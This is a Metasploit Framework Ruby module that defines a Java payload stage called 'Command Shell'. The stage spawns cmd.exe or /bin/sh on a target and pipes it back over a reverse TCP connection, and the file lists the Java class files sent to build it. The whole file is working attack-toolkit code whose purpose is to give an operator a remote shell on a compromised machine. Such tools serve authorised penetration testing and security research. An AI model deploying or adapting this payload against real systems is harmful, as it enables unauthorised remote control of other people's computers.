
##
# $Id: shell.rb 13213 2011-07-18 23:15:06Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/payload/java'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'


module Metasploit3

	# The stager should have already included this
	#include Msf::Payload::Java
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Command Shell',
			'Version'       => '$Revision: 13213 $',
			'Description'   => 'Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else)',
			'Author'        => [
					'mihi', # all the hard work
					'egypt' # msf integration
				],
			'Platform'      => 'java',
			'Arch'          => ARCH_JAVA,
			'PayloadCompat' =>
				{
					'Convention' => 'javasocket',
				},
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::CommandShell))

		# Order matters.  Classes can only reference classes that have already
		# been sent.  The last .class must implement Stage, i.e. have a start()
		# method.
		@stage_class_files = [
			[ "javapayload", "stage", "Stage.class" ],
			[ "javapayload", "stage", "StreamForwarder.class" ],
			[ "javapayload", "stage", "Shell.class" ],
		]
	end

end


